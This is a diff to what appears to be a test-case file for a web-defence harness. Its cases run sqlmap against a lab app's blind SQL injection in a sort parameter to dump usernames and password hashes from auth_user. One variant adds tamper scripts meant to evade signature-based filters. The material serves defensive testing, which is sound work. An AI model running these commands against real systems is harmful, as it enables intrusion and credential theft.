@@ -6,9 +6,12 @@
 # fires sqlmap at the dotted injection point (`posts_post.id*`) with
 # `--level=5 --risk=3`: sqlmap breaks out of the ORDER BY with `)` and finds the
 # boolean/time-based blind injection, then dumps auth_user (verified: admin,
-# jiwoo, minseo). `--disable-hashing` stops sqlmap offering to crack the dumped
-# pbkdf2 hashes, which `--batch` accepts and which never finishes; with it the
-# dump took 166 s with no WAF (2026-10-10). Error-based needs DEBUG, and the
+# jiwoo, minseo). `--answers=crack=N` declines sqlmap's offer to crack the
+# dumped pbkdf2 hashes, which `--batch` accepts and which never finishes; the
+# dump took 166 s with no WAF (2026-10-10). `--disable-hashing` did the same but
+# Ubuntu's sqlmap 1.8.4 on the OpenStack attacker rejects it. `--flush-session`
+# keeps a cached injection or dump on a persistent attacker from answering a
+# later run without sending a request. Error-based needs DEBUG, and the
 # app runs DEBUG=False, so the blind techniques are the ones that work. Submitting the dump to /loot/ is a
 # separate step, not done by the case.
 #
@@ -68,7 +71,7 @@
   args: ["-u", "{target}/?sort=posts_post.id*",
          "--technique=BT", "--level=5", "--risk=3", "--dbms=mysql",
          "-D", "board", "-T", "auth_user", "-C", "username,password",
-         "--dump", "--batch", "--disable-hashing"]
+         "--dump", "--batch", "--answers=crack=N", "--flush-session"]
 
 # The same injection with a browser User-Agent and tamper scripts that rewrite
 # spaces, comparison operators and keyword case: a defence that only matches
@@ -85,7 +88,7 @@
          "--technique=BT", "--level=5", "--risk=3", "--dbms=mysql",
          "--random-agent", "--tamper=space2comment,between,randomcase",
          "-D", "board", "-T", "auth_user", "-C", "username,password",
-         "--dump", "--batch", "--disable-hashing"]
+         "--dump", "--batch", "--answers=crack=N", "--flush-session"]
 
 - name: board-xss-script-tag-in-search
   malicious: true
